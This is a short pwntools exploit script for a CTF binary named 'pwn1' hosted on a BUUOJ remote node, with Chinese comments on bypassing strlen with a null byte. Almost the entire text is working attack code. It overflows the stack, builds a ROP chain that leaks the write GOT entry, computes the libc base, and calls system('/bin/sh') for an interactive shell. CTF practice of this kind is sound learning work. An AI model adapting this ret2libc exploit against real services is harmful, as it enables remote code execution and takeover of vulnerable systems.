# pwn1
# 本题有strlen影响 payload2, 使用\0来处理
# \x00绕过strlen, 补齐buf至少7位，否则报错
from pwn import *

# io = process('./pwn1', env={"LD_PRELOAD": "./libc-2.23.so"}) # 自定义预加载libc.so
io = remote('node4.buuoj.cn', 29399)
# io = process('./pwn1')
e = ELF('./pwn1')

payload1 = '\0' + '\xff' * 8
io.sendline(payload1)

main_addr = 0x08048825
write_plt = e.symbols["write"]
write_got = e.got["write"]

junk = 'a' * (0xe7 + 4)
payload2 = flat(junk, write_plt, main_addr, 1, write_got, 4)

io.sendline(payload2)
print(io.recvuntil('Correct\n'))
addr = unpack(io.recv(4))
print(hex(addr))

# round2

libc = ELF('./libc-2.23.so')
base = addr - libc.symbols['write']
system = base + libc.symbols['system']
str_bin_sh = base + libc.search(b'/bin/sh').__next__()
payload3 = flat(junk, system, 1, str_bin_sh)
io.sendline(payload1)
io.sendline(payload3)

io.interactive()
